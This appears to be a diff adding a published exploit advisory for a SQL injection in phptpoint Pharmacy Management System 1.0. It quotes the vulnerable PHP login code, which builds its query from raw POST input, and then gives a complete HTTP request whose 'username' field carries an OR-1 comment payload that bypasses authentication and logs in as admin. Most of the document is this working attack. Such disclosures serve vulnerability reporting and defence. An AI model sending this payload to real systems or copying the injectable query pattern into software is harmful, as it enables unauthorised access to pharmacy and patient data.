@@ -1,0 +1,46 @@
+# Exploit Title:  phptpoint Pharmacy Management System 1.0 - 'username' SQL injection
+# Date: 2018-10-24
+# Exploit Author: Boumediene KADDOUR
+# Unit: Algerie Telecom R&D Unit
+# Vendor Homepage: https://www.phptpoint.com/
+# Software Link: https://www.phptpoint.com/pharmacy-management-system/
+# Version: 1
+# Tested on: WAMP windows 10 x64
+# CVE: unknown
+
+# Description:
+# phptpoint Pharmacy Management System SQL injection suffers from a SQL
+# injection vulnerability that allows an attacker to bypass the login page
+# and authenticate as admin or any other user.
+
+# Vulnerable Code:
+
+# 4 $username=$_POST['username'];
+# 5 $password=$_POST['password'];
+# 6 $position=$_POST['position'];
+# 7 switch($position){
+# 8 case 'Admin':
+# 9 $result=mysql_query("SELECT admin_id, username FROM admin WHERE
+# username='$username' AND password='$password'");
+# 10 $row=mysql_fetch_array($result);
+
+# Payload:
+
+POST /Pharmacy/index.php HTTP/1.1
+Host: 172.16.122.4
+Content-Length: 80
+Cache-Control: max-age=0
+Origin: http://172.16.122.4
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://172.16.122.4/Pharmacy/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,fr;q=0.8,fr-FR;q=0.7
+Cookie: PHPSESSID=2kn5jlcarggk5u3bl1crarrj85
+Connection: close
+
+username=admin%27+OR+1+--+&password=anyPassword&position=Admin&submit=Login
